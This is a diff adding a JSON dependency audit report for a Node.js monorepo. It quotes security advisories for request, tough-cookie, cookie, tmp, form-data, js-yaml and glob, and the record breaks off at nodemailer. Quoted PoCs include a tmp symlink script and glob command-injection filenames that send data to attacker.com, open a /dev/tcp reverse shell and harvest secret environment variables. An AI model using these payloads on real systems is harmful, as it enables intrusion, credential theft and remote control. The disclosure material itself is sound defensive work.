@@ -1,0 +1,503 @@
+{
+  "actions": [
+    {
+      "action": "review",
+      "module": "request",
+      "resolves": [
+        {
+          "id": 1096727,
+          "path": "apps__api>truelayer-client>request",
+          "dev": false,
+          "bundled": false,
+          "optional": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "tough-cookie",
+      "resolves": [
+        {
+          "id": 1097682,
+          "path": "apps__api>truelayer-client>request>tough-cookie",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "cookie",
+      "resolves": [
+        {
+          "id": 1103907,
+          "path": "apps__web>@auth/core>cookie",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "tmp",
+      "resolves": [
+        {
+          "id": 1109537,
+          "path": "apps__api>@nestjs/cli>@angular-devkit/schematics-cli>inquirer>external-editor>tmp",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "form-data",
+      "resolves": [
+        {
+          "id": 1109540,
+          "path": "apps__api>truelayer-client>request>form-data",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "js-yaml",
+      "resolves": [
+        {
+          "id": 1109801,
+          "path": "apps__api>@e-invoice-eu/core>xmlbuilder2>js-yaml",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1109802,
+          "path": "apps__api>@nestjs/swagger>js-yaml",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "glob",
+      "resolves": [
+        {
+          "id": 1109842,
+          "path": "apps__api>@nestjs/cli>glob",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1109842,
+          "path": "apps__web>eslint-config-next>@next/eslint-plugin-next>glob",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "nodemailer",
+      "resolves": [
+        {
+          "id": 1111074,
+          "path": "apps__api>imapflow>nodemailer",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    }
+  ],
+  "advisories": {
+    "1096727": {
+      "findings": [
+        {
+          "version": "2.88.2",
+          "paths": [
+            "apps\\api > truelayer-client@1.3.2 > request@2.88.2",
+            "apps\\api > truelayer-client@1.3.2 > request-promise@4.2.6 > request@2.88.2",
+            "apps\\api > truelayer-client@1.3.2 > request-promise@4.2.6 > request-promise-core@1.1.4 > request@2.88.2"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2023-28155\n- https://github.com/request/request/issues/3442\n- https://github.com/request/request/pull/3444\n- https://doyensec.com/resources/Doyensec_Advisory_RequestSSRF_Q12023.pdf\n- https://github.com/github/advisory-database/pull/2500\n- https://github.com/cypress-io/request/blob/master/lib/redirect.js#L116\n- https://github.com/request/request/blob/master/lib/redirect.js#L111\n- https://github.com/cypress-io/request/pull/28\n- https://github.com/cypress-io/request/commit/c5bcf21d40fb61feaff21a0e5a2b3934a440024f\n- https://github.com/cypress-io/request/releases/tag/v3.0.0\n- https://security.netapp.com/advisory/ntap-20230413-0007\n- https://github.com/advisories/GHSA-p8p7-x288-28g6",
+      "created": "2023-03-16T15:30:19.000Z",
+      "id": 1096727,
+      "npm_advisory_id": null,
+      "overview": "The `request` package through 2.88.2 for Node.js and the `@cypress/request` package prior to 3.0.0 allow a bypass of SSRF mitigations via an attacker-controller server that does a cross-protocol redirect (HTTP to HTTPS, or HTTPS to HTTP).\n\nNOTE: The `request` package is no longer supported by the maintainer.",
+      "reported_by": null,
+      "title": "Server-Side Request Forgery in Request",
+      "metadata": null,
+      "cves": [
+        "CVE-2023-28155"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "request",
+      "vulnerable_versions": "<=2.88.2",
+      "github_advisory_id": "GHSA-p8p7-x288-28g6",
+      "recommendation": "None",
+      "patched_versions": "<0.0.0",
+      "updated": "2024-03-21T17:47:21.000Z",
+      "cvss": {
+        "score": 6.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-918"
+      ],
+      "url": "https://github.com/advisories/GHSA-p8p7-x288-28g6"
+    },
+    "1097682": {
+      "findings": [
+        {
+          "version": "2.5.0",
+          "paths": [
+            "apps\\api > truelayer-client@1.3.2 > request@2.88.2 > tough-cookie@2.5.0",
+            "apps\\api > truelayer-client@1.3.2 > request-promise@4.2.6 > request@2.88.2 > tough-cookie@2.5.0",
+            "apps\\api > truelayer-client@1.3.2 > request-promise@4.2.6 > request-promise-core@1.1.4 > request@2.88.2 > tough-cookie@2.5.0",
+            "apps\\api > truelayer-client@1.3.2 > request-promise@4.2.6 > tough-cookie@2.5.0"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2023-26136\n- https://github.com/salesforce/tough-cookie/issues/282\n- https://github.com/salesforce/tough-cookie/commit/12d474791bb856004e858fdb1c47b7608d09cf6e\n- https://github.com/salesforce/tough-cookie/releases/tag/v4.1.3\n- https://security.snyk.io/vuln/SNYK-JS-TOUGHCOOKIE-5672873\n- https://lists.debian.org/debian-lts-announce/2023/07/msg00010.html\n- https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/3HUE6ZR5SL73KHL7XUPAOEL6SB7HUDT2\n- https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/6PVVPNSAGSDS63HQ74PJ7MZ3MU5IYNVZ\n- https://security.netapp.com/advisory/ntap-20240621-0006\n- https://github.com/advisories/GHSA-72xf-g2v4-qvf3",
+      "created": "2023-07-01T06:30:16.000Z",
+      "id": 1097682,
+      "npm_advisory_id": null,
+      "overview": "Versions of the package tough-cookie before 4.1.3 are vulnerable to Prototype Pollution due to improper handling of Cookies when using CookieJar in `rejectPublicSuffixes=false` mode. This issue arises from the manner in which the objects are initialized.",
+      "reported_by": null,
+      "title": "tough-cookie Prototype Pollution vulnerability",
+      "metadata": null,
+      "cves": [
+        "CVE-2023-26136"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "tough-cookie",
+      "vulnerable_versions": "<4.1.3",
+      "github_advisory_id": "GHSA-72xf-g2v4-qvf3",
+      "recommendation": "Upgrade to version 4.1.3 or later",
+      "patched_versions": ">=4.1.3",
+      "updated": "2024-06-21T21:33:53.000Z",
+      "cvss": {
+        "score": 6.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-1321"
+      ],
+      "url": "https://github.com/advisories/GHSA-72xf-g2v4-qvf3"
+    },
+    "1103907": {
+      "findings": [
+        {
+          "version": "0.6.0",
+          "paths": [
+            "apps\\web > @auth/core@0.34.3 > cookie@0.6.0",
+            "apps\\web > next-auth@4.24.13 > @auth/core@0.34.3 > cookie@0.6.0"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/jshttp/cookie/security/advisories/GHSA-pxg6-pf52-xh8x\n- https://github.com/jshttp/cookie/pull/167\n- https://github.com/jshttp/cookie/commit/e10042845354fea83bd8f34af72475eed1dadf5c\n- https://github.com/advisories/GHSA-pxg6-pf52-xh8x",
+      "created": "2024-10-04T20:31:00.000Z",
+      "id": 1103907,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nThe cookie name could be used to set other fields of the cookie, resulting in an unexpected cookie value. For example, `serialize(\"userName=<script>alert('XSS3')</script>; Max-Age=2592000; a\", value)` would result in `\"userName=<script>alert('XSS3')</script>; Max-Age=2592000; a=test\"`, setting `userName` cookie to `<script>` and ignoring `value`.\n\nA similar escape can be used for `path` and `domain`, which could be abused to alter other fields of the cookie.\n\n### Patches\n\nUpgrade to 0.7.0, which updates the validation for `name`, `path`, and `domain`.\n\n### Workarounds\n\nAvoid passing untrusted or arbitrary values for these fields, ensure they are set by the application instead of user input.\n\n### References\n\n* https://github.com/jshttp/cookie/pull/167",
+      "reported_by": null,
+      "title": "cookie accepts cookie name, path, and domain with out of bounds characters",
+      "metadata": null,
+      "cves": [
+        "CVE-2024-47764"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "cookie",
+      "vulnerable_versions": "<0.7.0",
+      "github_advisory_id": "GHSA-pxg6-pf52-xh8x",
+      "recommendation": "Upgrade to version 0.7.0 or later",
+      "patched_versions": ">=0.7.0",
+      "updated": "2025-04-15T13:56:44.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-74"
+      ],
+      "url": "https://github.com/advisories/GHSA-pxg6-pf52-xh8x"
+    },
+    "1109537": {
+      "findings": [
+        {
+          "version": "0.0.33",
+          "paths": [
+            "apps\\api > @nestjs/cli@10.4.9 > @angular-devkit/schematics-cli@17.3.11 > inquirer@9.2.15 > external-editor@3.1.0 > tmp@0.0.33",
+            "apps\\api > @nestjs/cli@10.4.9 > inquirer@8.2.6 > external-editor@3.1.0 > tmp@0.0.33"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/raszi/node-tmp/security/advisories/GHSA-52f5-9888-hmc6\n- https://github.com/raszi/node-tmp/commit/188b25e529496e37adaf1a1d9dccb40019a08b1b\n- https://nvd.nist.gov/vuln/detail/CVE-2025-54798\n- https://github.com/raszi/node-tmp/issues/207\n- https://lists.debian.org/debian-lts-announce/2025/08/msg00007.html\n- https://github.com/advisories/GHSA-52f5-9888-hmc6",
+      "created": "2025-08-06T17:06:04.000Z",
+      "id": 1109537,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`tmp@0.2.3` is vulnerable to an Arbitrary temporary file / directory write via symbolic link `dir` parameter.\n\n\n### Details\n\nAccording to the documentation there are some conditions that must be held:\n\n```\n// https://github.com/raszi/node-tmp/blob/v0.2.3/README.md?plain=1#L41-L50\n\nOther breaking changes, i.e.\n\n- template must be relative to tmpdir\n- name must be relative to tmpdir\n- dir option must be relative to tmpdir //<-- this assumption can be bypassed using symlinks\n\nare still in place.\n\nIn order to override the system's tmpdir, you will have to use the newly\nintroduced tmpdir option.\n\n\n// https://github.com/raszi/node-tmp/blob/v0.2.3/README.md?plain=1#L375\n* `dir`: the optional temporary directory that must be relative to the system's default temporary directory.\n     absolute paths are fine as long as they point to a location under the system's default temporary directory.\n     Any directories along the so specified path must exist, otherwise a ENOENT error will be thrown upon access, \n     as tmp will not check the availability of the path, nor will it establish the requested path for you.\n```\n\nRelated issue: https://github.com/raszi/node-tmp/issues/207.\n\n\nThe issue occurs because `_resolvePath` does not properly handle symbolic link when resolving paths:\n```js\n// https://github.com/raszi/node-tmp/blob/v0.2.3/lib/tmp.js#L573-L579\nfunction _resolvePath(name, tmpDir) {\n  if (name.startsWith(tmpDir)) {\n    return path.resolve(name);\n  } else {\n    return path.resolve(path.join(tmpDir, name));\n  }\n}\n```\n\nIf the `dir` parameter points to a symlink that resolves to a folder outside the `tmpDir`, it's possible to bypass the `_assertIsRelative` check used in `_assertAndSanitizeOptions`:\n```js\n// https://github.com/raszi/node-tmp/blob/v0.2.3/lib/tmp.js#L590-L609\nfunction _assertIsRelative(name, option, tmpDir) {\n  if (option === 'name') {\n    // assert that name is not absolute and does not contain a path\n    if (path.isAbsolute(name))\n      throw new Error(`${option} option must not contain an absolute path, found \"${name}\".`);\n    // must not fail on valid .<name> or ..<name> or similar such constructs\n    let basename = path.basename(name);\n    if (basename === '..' || basename === '.' || basename !== name)\n      throw new Error(`${option} option must not contain a path, found \"${name}\".`);\n  }\n  else { // if (option === 'dir' || option === 'template') {\n    // assert that dir or template are relative to tmpDir\n    if (path.isAbsolute(name) && !name.startsWith(tmpDir)) {\n      throw new Error(`${option} option must be relative to \"${tmpDir}\", found \"${name}\".`);\n    }\n    let resolvedPath = _resolvePath(name, tmpDir); //<--- \n    if (!resolvedPath.startsWith(tmpDir))\n      throw new Error(`${option} option must be relative to \"${tmpDir}\", found \"${resolvedPath}\".`);\n  }\n}\n```\n\n\n### PoC\n\nThe following PoC demonstrates how writing a tmp file on a folder outside the `tmpDir` is possible.\nTested on a Linux machine.\n\n- Setup: create a symbolic link inside the `tmpDir` that points to a directory outside of it\n```bash\nmkdir $HOME/mydir1\n\nln -s $HOME/mydir1 ${TMPDIR:-/tmp}/evil-dir\n```\n\n- check the folder is empty:\n```bash\nls -lha $HOME/mydir1 | grep \"tmp-\"\n```\n\n- run the poc\n```bash\nnode main.js\nFile:  /tmp/evil-dir/tmp-26821-Vw87SLRaBIlf\ntest 1: ENOENT: no such file or directory, open '/tmp/mydir1/tmp-[random-id]'\ntest 2: dir option must be relative to \"/tmp\", found \"/foo\".\ntest 3: dir option must be relative to \"/tmp\", found \"/home/user/mydir1\".\n```\n\n- the temporary file is created under `$HOME/mydir1` (outside the `tmpDir`):\n```bash\nls -lha $HOME/mydir1 | grep \"tmp-\"\n-rw------- 1 user user    0 Apr  X XX:XX tmp-[random-id]\n```\n\n\n- `main.js`\n```js\n// npm i tmp@0.2.3\n\nconst tmp = require('tmp');\n\nconst tmpobj = tmp.fileSync({ 'dir': 'evil-dir'});\nconsole.log('File: ', tmpobj.name);\n\ntry {\n    tmp.fileSync({ 'dir': 'mydir1'});\n} catch (err) {\n    console.log('test 1:', err.message)\n}\n\ntry {\n    tmp.fileSync({ 'dir': '/foo'});\n} catch (err) {\n    console.log('test 2:', err.message)\n}\n\ntry {\n    const fs = require('node:fs');\n    const resolved = fs.realpathSync('/tmp/evil-dir');\n    tmp.fileSync({ 'dir': resolved});\n} catch (err) {\n    console.log('test 3:', err.message)\n}\n```\n\n\nA Potential fix could be to call `fs.realpathSync` (or similar) that resolves also symbolic links.\n```js\nfunction _resolvePath(name, tmpDir) {\n  let resolvedPath;\n  if (name.startsWith(tmpDir)) {\n    resolvedPath = path.resolve(name);\n  } else {\n    resolvedPath = path.resolve(path.join(tmpDir, name));\n  }\n  return fs.realpathSync(resolvedPath);\n}\n```\n\n\n### Impact\n\nArbitrary temporary file / directory write via symlink",
+      "reported_by": null,
+      "title": "tmp allows arbitrary temporary file / directory write via symbolic link `dir` parameter",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-54798"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "tmp",
+      "vulnerable_versions": "<=0.2.3",
+      "github_advisory_id": "GHSA-52f5-9888-hmc6",
+      "recommendation": "Upgrade to version 0.2.4 or later",
+      "patched_versions": ">=0.2.4",
+      "updated": "2025-11-03T21:34:21.000Z",
+      "cvss": {
+        "score": 2.5,
+        "vectorString": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-59"
+      ],
+      "url": "https://github.com/advisories/GHSA-52f5-9888-hmc6"
+    },
+    "1109540": {
+      "findings": [
+        {
+          "version": "2.3.3",
+          "paths": [
+            "apps\\api > truelayer-client@1.3.2 > request@2.88.2 > form-data@2.3.3",
+            "apps\\api > truelayer-client@1.3.2 > request-promise@4.2.6 > request@2.88.2 > form-data@2.3.3",
+            "apps\\api > truelayer-client@1.3.2 > request-promise@4.2.6 > request-promise-core@1.1.4 > request@2.88.2 > form-data@2.3.3"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/form-data/form-data/security/advisories/GHSA-fjxv-7rqg-78g4\n- https://nvd.nist.gov/vuln/detail/CVE-2025-7783\n- https://github.com/form-data/form-data/commit/3d1723080e6577a66f17f163ecd345a21d8d0fd0\n- https://github.com/benweissmann/CVE-2025-7783-poc\n- https://lists.debian.org/debian-lts-announce/2025/07/msg00023.html\n- https://github.com/advisories/GHSA-fjxv-7rqg-78g4",
+      "created": "2025-07-21T19:04:54.000Z",
+      "id": 1109540,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nform-data uses `Math.random()` to select a boundary value for multipart form-encoded data. This can lead to a security issue if an attacker:\n1. can observe other values produced by Math.random in the target application, and\n2. can control one field of a request made using form-data\n\nBecause the values of Math.random() are pseudo-random and predictable (see: https://blog.securityevaluators.com/hacking-the-javascript-lottery-80cc437e3b7f), an attacker who can observe a few sequential values can determine the state of the PRNG and predict future values, includes those used to generate form-data's boundary value. The allows the attacker to craft a value that contains a boundary value, allowing them to inject additional parameters into the request.\n\nThis is largely the same vulnerability as was [recently found in `undici`](https://hackerone.com/reports/2913312) by [`parrot409`](https://hackerone.com/parrot409?type=user) -- I'm not affiliated with that researcher but want to give credit where credit is due! My PoC is largely based on their work.\n\n### Details\n\nThe culprit is this line here: https://github.com/form-data/form-data/blob/426ba9ac440f95d1998dac9a5cd8d738043b048f/lib/form_data.js#L347\n\nAn attacker who is able to predict the output of Math.random() can predict this boundary value, and craft a payload that contains the boundary value, followed by another, fully attacker-controlled field. This is roughly equivalent to any sort of improper escaping vulnerability, with the caveat that the attacker must find a way to observe other Math.random() values generated by the application to solve for the state of the PRNG. However, Math.random() is used in all sorts of places that might be visible to an attacker (including by form-data itself, if the attacker can arrange for the vulnerable application to make a request to an attacker-controlled server using form-data, such as a user-controlled webhook -- the attacker could observe the boundary values from those requests to observe the Math.random() outputs). A common example would be a `x-request-id` header added by the server. These sorts of headers are often used for distributed tracing, to correlate errors across the frontend and backend. `Math.random()` is a fine place to get these sorts of IDs (in fact, [opentelemetry uses Math.random for this purpose](https://github.com/open-telemetry/opentelemetry-js/blob/2053f0d3a44631ade77ea04f656056a2c8a2ae76/packages/opentelemetry-sdk-trace-base/src/platform/node/RandomIdGenerator.ts#L22))\n\n### PoC\n\nPoC here: https://github.com/benweissmann/CVE-2025-7783-poc\n\nInstructions are in that repo. It's based on the PoC from https://hackerone.com/reports/2913312 but simplified somewhat; the vulnerable application has a more direct side-channel from which to observe Math.random() values (a separate endpoint that happens to include a randomly-generated request ID). \n\n### Impact\n\nFor an application to be vulnerable, it must:\n- Use `form-data` to send data including user-controlled data to some other system. The attacker must be able to do something malicious by adding extra parameters (that were not intended to be user-controlled) to this request. Depending on the target system's handling of repeated parameters, the attacker might be able to overwrite values in addition to appending values (some multipart form handlers deal with repeats by overwriting values instead of representing them as an array)\n- Reveal values of Math.random(). It's easiest if the attacker can observe multiple sequential values, but more complex math could recover the PRNG state to some degree of confidence with non-sequential values. \n\nIf an application is vulnerable, this allows an attacker to make arbitrary requests to internal systems.",
+      "reported_by": null,
+      "title": "form-data uses unsafe random function in form-data for choosing boundary",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-7783"
+      ],
+      "access": "public",
+      "severity": "critical",
+      "module_name": "form-data",
+      "vulnerable_versions": "<2.5.4",
+      "github_advisory_id": "GHSA-fjxv-7rqg-78g4",
+      "recommendation": "Upgrade to version 2.5.4 or later",
+      "patched_versions": ">=2.5.4",
+      "updated": "2025-11-03T21:34:09.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-330"
+      ],
+      "url": "https://github.com/advisories/GHSA-fjxv-7rqg-78g4"
+    },
+    "1109801": {
+      "findings": [
+        {
+          "version": "3.14.1",
+          "paths": [
+            "apps\\api > @e-invoice-eu/core@2.1.15 > xmlbuilder2@3.1.1 > js-yaml@3.14.1"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodeca/js-yaml/security/advisories/GHSA-mh29-5h37-fv8m\n- https://nvd.nist.gov/vuln/detail/CVE-2025-64718\n- https://github.com/nodeca/js-yaml/commit/383665ff4248ec2192d1274e934462bb30426879\n- https://github.com/nodeca/js-yaml/commit/5278870a17454fe8621dbd8c445c412529525266\n- https://github.com/advisories/GHSA-mh29-5h37-fv8m",
+      "created": "2025-11-14T14:29:48.000Z",
+      "id": 1109801,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nIn js-yaml 4.1.0, 4.0.0, and 3.14.1 and below, it's possible for an attacker to modify the prototype of the result of a parsed yaml document via prototype pollution (`__proto__`). All users who parse untrusted yaml documents may be impacted.\n\n### Patches\n\nProblem is patched in js-yaml 4.1.1 and 3.14.2.\n\n### Workarounds\n\nYou can protect against this kind of attack on the server by using `node --disable-proto=delete` or `deno` (in Deno, pollution protection is on by default).\n\n### References\n\nhttps://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html",
+      "reported_by": null,
+      "title": "js-yaml has prototype pollution in merge (<<)",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-64718"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "js-yaml",
+      "vulnerable_versions": "<3.14.2",
+      "github_advisory_id": "GHSA-mh29-5h37-fv8m",
+      "recommendation": "Upgrade to version 3.14.2 or later",
+      "patched_versions": ">=3.14.2",
+      "updated": "2025-11-17T15:20:44.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-1321"
+      ],
+      "url": "https://github.com/advisories/GHSA-mh29-5h37-fv8m"
+    },
+    "1109802": {
+      "findings": [
+        {
+          "version": "4.1.0",
+          "paths": [
+            "apps\\api > @nestjs/swagger@7.4.2 > js-yaml@4.1.0"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodeca/js-yaml/security/advisories/GHSA-mh29-5h37-fv8m\n- https://nvd.nist.gov/vuln/detail/CVE-2025-64718\n- https://github.com/nodeca/js-yaml/commit/383665ff4248ec2192d1274e934462bb30426879\n- https://github.com/nodeca/js-yaml/commit/5278870a17454fe8621dbd8c445c412529525266\n- https://github.com/advisories/GHSA-mh29-5h37-fv8m",
+      "created": "2025-11-14T14:29:48.000Z",
+      "id": 1109802,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nIn js-yaml 4.1.0, 4.0.0, and 3.14.1 and below, it's possible for an attacker to modify the prototype of the result of a parsed yaml document via prototype pollution (`__proto__`). All users who parse untrusted yaml documents may be impacted.\n\n### Patches\n\nProblem is patched in js-yaml 4.1.1 and 3.14.2.\n\n### Workarounds\n\nYou can protect against this kind of attack on the server by using `node --disable-proto=delete` or `deno` (in Deno, pollution protection is on by default).\n\n### References\n\nhttps://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html",
+      "reported_by": null,
+      "title": "js-yaml has prototype pollution in merge (<<)",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-64718"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "js-yaml",
+      "vulnerable_versions": ">=4.0.0 <4.1.1",
+      "github_advisory_id": "GHSA-mh29-5h37-fv8m",
+      "recommendation": "Upgrade to version 4.1.1 or later",
+      "patched_versions": ">=4.1.1",
+      "updated": "2025-11-17T15:20:44.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-1321"
+      ],
+      "url": "https://github.com/advisories/GHSA-mh29-5h37-fv8m"
+    },
+    "1109842": {
+      "findings": [
+        {
+          "version": "10.4.5",
+          "paths": [
+            "apps\\api > @nestjs/cli@10.4.9 > glob@10.4.5"
+          ]
+        },
+        {
+          "version": "10.3.10",
+          "paths": [
+            "apps\\web > eslint-config-next@14.2.33 > @next/eslint-plugin-next@14.2.33 > glob@10.3.10"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/node-glob/security/advisories/GHSA-5j98-mcp5-4vw2\n- https://github.com/isaacs/node-glob/commit/47473c046b91c67269df7a66eab782a6c2716146\n- https://nvd.nist.gov/vuln/detail/CVE-2025-64756\n- https://github.com/isaacs/node-glob/commit/1e4e297342a09f2aa0ced87fcd4a70ddc325d75f\n- https://github.com/advisories/GHSA-5j98-mcp5-4vw2",
+      "created": "2025-11-17T17:38:56.000Z",
+      "id": 1109842,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nThe glob CLI contains a command injection vulnerability in its `-c/--cmd` option that allows arbitrary command execution when processing files with malicious names. When `glob -c <command> <patterns>` is used, matched filenames are passed to a shell with `shell: true`, enabling shell metacharacters in filenames to trigger command injection and achieve arbitrary code execution under the user or CI account privileges.\n\n### Details\n\n**Root Cause:**\nThe vulnerability exists in `src/bin.mts:277` where the CLI collects glob matches and executes the supplied command using `foregroundChild()` with `shell: true`:\n\n```javascript\nstream.on('end', () => foregroundChild(cmd, matches, { shell: true }))\n```\n\n**Technical Flow:**\n1. User runs `glob -c <command> <pattern>` \n2. CLI finds files matching the pattern\n3. Matched filenames are collected into an array\n4. Command is executed with matched filenames as arguments using `shell: true`\n5. Shell interprets metacharacters in filenames as command syntax\n6. Malicious filenames execute arbitrary commands\n\n**Affected Component:**\n- **CLI Only:** The vulnerability affects only the command-line interface\n- **Library Safe:** The core glob library API (`glob()`, `globSync()`, streams/iterators) is not affected\n- **Shell Dependency:** Exploitation requires shell metacharacter support (primarily POSIX systems)\n\n**Attack Surface:**\n- Files with names containing shell metacharacters: `$()`, backticks, `;`, `&`, `|`, etc.\n- Any directory where attackers can control filenames (PR branches, archives, user uploads)\n- CI/CD pipelines using `glob -c` on untrusted content\n\n### PoC\n\n**Setup Malicious File:**\n```bash\nmkdir test_directory && cd test_directory\n\n# Create file with command injection payload in filename\ntouch '$(touch injected_poc)'\n```\n\n**Trigger Vulnerability:**\n```bash\n# Run glob CLI with -c option\nnode /path/to/glob/dist/esm/bin.mjs -c echo \"**/*\"\n```\n\n**Result:**\n- The echo command executes normally\n- **Additionally:** The `$(touch injected_poc)` in the filename is evaluated by the shell\n- A new file `injected_poc` is created, proving command execution\n- Any command can be injected this way with full user privileges\n\n**Advanced Payload Examples:**\n\n**Data Exfiltration:**\n```bash\n# Filename: $(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)\ntouch '$(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)'\n```\n\n**Reverse Shell:**\n```bash\n# Filename: $(bash -i >& /dev/tcp/attacker.com/4444 0>&1)\ntouch '$(bash -i >& /dev/tcp/attacker.com/4444 0>&1)'\n```\n\n**Environment Variable Harvesting:**\n```bash\n# Filename: $(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)\ntouch '$(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)'\n```\n\n### Impact\n\n**Arbitrary Command Execution:**\n- Commands execute with full privileges of the user running glob CLI\n- No privilege escalation required - runs as current user\n- Access to environment variables, file system, and network\n\n**Real-World Attack Scenarios:**\n\n**1. CI/CD Pipeline Compromise:**\n- Malicious PR adds files with crafted names to repository\n- CI pipeline uses `glob -c` to process files (linting, testing, deployment)\n- Commands execute in CI environment with build secrets and deployment credentials\n- Potential for supply chain compromise through artifact tampering\n\n**2. Developer Workstation Attack:**\n- Developer clones repository or extracts archive containing malicious filenames\n- Local build scripts use `glob -c` for file processing\n- Developer machine compromise with access to SSH keys, tokens, local services\n\n**3. Automated Processing Systems:**\n- Services using glob CLI to process uploaded files or external content\n- File uploads with malicious names trigger command execution\n- Server-side compromise with potential for lateral movement\n\n**4. Supply Chain Poisoning:**\n- Malicious packages or themes include files with crafted names\n- Build processes using glob CLI automatically process these files\n- Wide distribution of compromise through package ecosystems\n\n**Platform-Specific Risks:**\n- **POSIX/Linux/macOS:** High risk due to flexible filename characters and shell parsing\n- **Windows:** Lower risk due to filename restrictions, but vulnerability persists with PowerShell, Git Bash, WSL\n- **Mixed Environments:** CI systems often use Linux containers regardless of developer platform\n\n### Affected Products\n\n- **Ecosystem:** npm\n- **Package name:** glob\n- **Component:** CLI only (`src/bin.mts`)\n- **Affected versions:** v10.2.0 through v11.0.3 (and likely later versions until patched)\n- **Introduced:** v10.2.0 (first release with CLI containing `-c/--cmd` option)\n- **Patched versions:** 11.1.0and 10.5.0\n\n**Scope Limitation:**\n- **Library API Not Affected:** Core glob functions (`glob()`, `globSync()`, async iterators) are safe\n- **CLI-Specific:** Only the command-line interface with `-c/--cmd` option is vulnerable\n\n### Remediation\n\n- Upgrade to `glob@10.5.0`, `glob@11.1.0`, or higher, as soon as possible.\n- If any `glob` CLI actions fail, then convert commands containing positional arguments, to use the `--cmd-arg`/`-g` option instead.\n- As a last resort, use `--shell` to maintain `shell:true` behavior until glob v12, but take care to ensure that no untrusted contents can possibly be encountered in the file path results.",
+      "reported_by": null,
+      "title": "glob CLI: Command injection via -c/--cmd executes matches with shell:true",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-64756"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "glob",
+      "vulnerable_versions": ">=10.2.0 <10.5.0",
+      "github_advisory_id": "GHSA-5j98-mcp5-4vw2",
+      "recommendation": "Upgrade to version 10.5.0 or later",
+      "patched_versions": ">=10.5.0",
+      "updated": "2025-11-19T02:30:53.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cwe": [
+        "CWE-78"
+      ],
+      "url": "https://github.com/advisories/GHSA-5j98-mcp5-4vw2"
+    },
+    "1111074": {
+      "findings": [
+        {
+          "version": "7.0.10",
+          "paths": [
+            "apps\\api > imapflow@1.1.1 > nodemailer@7.0.10",
+            "apps\\api > mailparser@3.9.0 > nodemailer@7.0.10"
